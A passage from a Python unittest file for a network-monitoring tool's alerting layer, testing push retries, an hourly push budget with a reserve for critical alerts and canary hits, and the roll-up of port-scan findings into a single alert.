        self.assertEqual(service.window.pending, {})
        self.assertEqual(service.window.open_items()['failed_pushes'], [])

    def test_a_send_that_raises_is_retried_too(self):
        service = self.service()

        def broken(findings):
            raise RuntimeError('the notifier fell over')

        retry = service.notifier.retry
        service.notifier.send = broken
        self.deliver(service, _canary_hit())
        self.assertEqual(len(service.window.pending), 1)
        self.opener.fail = False
        service.notifier.retry = retry
        self.tick(service, 61)
        self.assertEqual(len(self.opener.bodies), 1)
        # The send never got as far as an extract, so the retry cut one.
        self.assertEqual(self.ring.cuts, 1)
        self.assertIn(_Ring.PATH, self.opener.bodies[0])


# ─── M20: no push budget ─────────────────────────────────────────────────────

def _high(n, src='192.168.10.20', port=53):
    from netmon.events import Event, Finding
    dst = f'203.0.113.{n}'
    return Finding('dns_bypass', 'DNS sent somewhere other than the gateway',
                   severity='high', tier='push', device='ops-laptop-3',
                   key=dst, description=f'ops-laptop-3 sent dns to {dst}',
                   event=Event(kind='dns', ts=1_790_000_000.0, src_ip=src,
                               dst_ip=dst, dst_port=port, protocol='udp'))


class TestThePushBudget(_ServiceWithNtfy):
    """Six an hour here, two of them kept for what must always get through."""

    def setUp(self):
        super().setUp()
        self.opener.fail = False

    def flood(self, service, count=10, start=1):
        with self.assertLogs('netmon.alerting', level='WARNING'):
            service.deliver([_high(n) for n in range(start, start + count)])

    def test_ordinary_pushes_stop_at_the_budget_and_go_to_the_digest(self):
        service = self.service(budget=(6, 2))
        self.flood(service)
        self.assertEqual(len(self.opener.bodies), 4)
        self.assertEqual(self.ring.cuts, 4)          # none for what was held
        held = [f for f in service.recent if f.push_status == 'held']
        self.assertEqual(len(held), 6)
        self.assertEqual(held[0].as_dict()['push_status'], 'held')
        body = service.digest_body()
        self.assertIn('6 held back from push by the hourly budget', body)
        self.assertIn('[held by the push budget]', body)
        self.assertEqual(service.window.pending, {})   # held, not retried

    def test_critical_findings_and_canary_hits_always_get_through(self):
        service = self.service(budget=(6, 2))
        self.flood(service, count=20)
        critical = _high(99)
        critical.severity = 'critical'
        service.deliver([critical, _canary_hit()])
        self.assertEqual(len(self.opener.bodies), 6)
        self.assertEqual(service.recent[-1].push_status, '')
        self.assertEqual(service.recent[-2].push_status, '')

    def test_a_restart_is_not_a_new_hour_but_an_hour_is(self):
        self.flood(self.service(budget=(6, 2)))
        restarted = self.service(budget=(6, 2))
        with self.assertLogs('netmon.alerting', level='WARNING'):
            restarted.deliver([_high(50)])
        self.assertEqual(len(self.opener.bodies), 4)
        self.clock.now += 3601
        restarted.deliver([_high(51)])
        self.assertEqual(len(self.opener.bodies), 5)

    def test_the_service_keeps_its_budget_under_state(self):
        from unittest import mock
        from netmon.service import Service, ServiceConfig
        state = os.path.join(self.scratch, 'state')
        config = ServiceConfig(profile_path=EXAMPLE, state_dir=state)
        config.web_port = None
        settings = {'NETMON_NTFY_SERVER': 'https://ntfy.example.test',
                    'NETMON_NTFY_TOPIC': 'site', 'NETMON_PUSH_BUDGET': '12',
                    'NETMON_PUSH_RESERVE': '3'}
        with mock.patch.dict(os.environ, settings):
            os.environ.pop('NETMON_SECRETS', None)
            budget = Service(config).notifier.budget
        self.assertEqual(budget.path, os.path.join(state, 'push-budget.json'))
        self.assertEqual((budget.per_hour, budget.reserve), (12, 3))

    def test_a_mistyped_budget_is_the_default(self):
        from netmon.alerting import PushBudget, load_config
        with self.assertLogs('netmon.alerting', level='WARNING'):
            config = load_config(None, environ={'NETMON_PUSH_BUDGET': '2O'})
        self.assertEqual(config.push_budget, PushBudget.PER_HOUR)
        self.assertEqual(load_config(None, environ={
            'NETMON_PUSH_BUDGET': '0'}).push_budget, 0)


class TestScansAreRolledUp(_ServiceWithNtfy):

    def setUp(self):
        super().setUp()
        self.opener.fail = False

    def scan(self, ports):
        from netmon.events import Event, Finding
        out = []
        for port in ports:
            event = Event(kind='flow', ts=1_790_000_000.0 + port,
                          src_ip='10.10.60.50', dst_ip='10.10.20.21',
                          dst_port=port, protocol='tcp')
            out.append(Finding(
                'cross_vlan_unexpected', 'Traffic between VLANs',
                severity='high', tier='push', device='ops-workstation',
                key=f'60->20:{port}', event=event,
                description=f'ops-workstation reached ahu on tcp/{port}'))
        return out

    def test_a_port_scan_is_one_push_with_one_extract(self):
        service = self.service()
        service.deliver(self.scan(range(1, 301)))
        self.assertEqual(len(self.opener.bodies), 1)
        self.assertEqual(self.ring.cuts, 1)
        self.assertEqual(len(service.recent), 1)
        rolled = service.recent[0]
        self.assertEqual(rolled.count, 300)
        self.assertEqual(rolled.key, '10.10.60.50->10.10.20.21/scan')
        self.assertIn('300 ports', rolled.description)
        self.assertIn('300 ports', self.opener.bodies[0])

    def test_the_next_pass_of_the_same_scan_is_a_repeat(self):
        service = self.service()
        service.deliver(self.scan(range(1, 101)))
        service.deliver(self.scan(range(101, 201)))
        self.assertEqual(len(self.opener.bodies), 1)
        self.assertEqual(service.recent[0].count, 200)

    def test_a_few_ports_are_not_a_scan(self):
        service = self.service()
        service.deliver(self.scan([80, 443, 8443]))
        self.assertEqual(len(self.opener.bodies), 3)


if __name__ == '__main__':
    unittest.main(verbosity=2)
